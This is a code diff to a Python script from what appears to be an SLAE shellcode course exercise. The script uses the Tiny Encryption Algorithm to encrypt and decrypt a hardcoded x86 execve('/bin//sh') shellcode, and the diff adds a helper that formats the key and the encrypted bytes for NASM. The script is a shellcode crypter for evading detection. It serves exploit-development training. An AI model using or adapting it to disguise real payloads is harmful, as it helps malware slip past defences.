@@ -2,12 +2,14 @@
 # SLAE-1511
 #Pyhton Implementation of the Tiny Encryption Algorithm (TEA)
 #https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm
+#Tested on both Python 3.6.9 (ubuntu) and 3.8.2 (win 10)
 
 import ctypes
 import string
 import random
 import itertools
 import math
+
 
 def crypt(plaintext, key):
     """
@@ -28,6 +30,7 @@ def crypt(plaintext, key):
     bytearray = b"".join(_vec2str(_crypt(chunk, k))for chunk in _chunks(v, 2))
 
     return bytearray
+
 
 def _str2vec(string, l=4):
     """
@@ -164,13 +167,29 @@ def key_generator(size=16, chars=string.ascii_uppercase + string.ascii_lowercase
     key=str("".join(random.choice(chars) for _ in range(size))).encode()
     key=bytearray(key)
     return key
-    
-    
+
+
+def nasm_gen(string):
+    """
+    Generate a nasm formatted shellcode.
+
+    :param size:
+        Hex encoded string.
+
+    :return:
+        Nasm formatted string.
+    """
+    string="0x"+"0x".join(a+b for a,b in zip(string[::2], string[1::2]))
+    string=", ".join(string[i:i+4] for i in range(0, len(string), 4))
+    return string
+
+
 if __name__ == "__main__":
     key=key_generator()
     print("key: {}".format(key))
     hex_key=key.hex()
     print("hex key: {}".format(hex_key))
+    print("NASM ready key: {}".format(nasm_gen(hex_key)))
     print("-------------------------------")
     shellcode=bytearray(b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80")
     print("shellcode: {}".format(shellcode))
@@ -208,7 +227,9 @@ if __name__ == "__main__":
     print("Encrypted shellcode:")
     enc = crypt(shellcode, key)
     print(enc)
-    print("crypted shellcode in hex: {}".format(enc.hex()))
+    hex_enc=enc.hex()
+    print("crypted shellcode in hex: {}".format(hex_enc))
+    print("NASM ready shellcode: {}".format(nasm_gen(hex_enc)))
     print("-------------------------------")
     print("Decrypted shellcode:")
     dec=decrypt(enc, key)
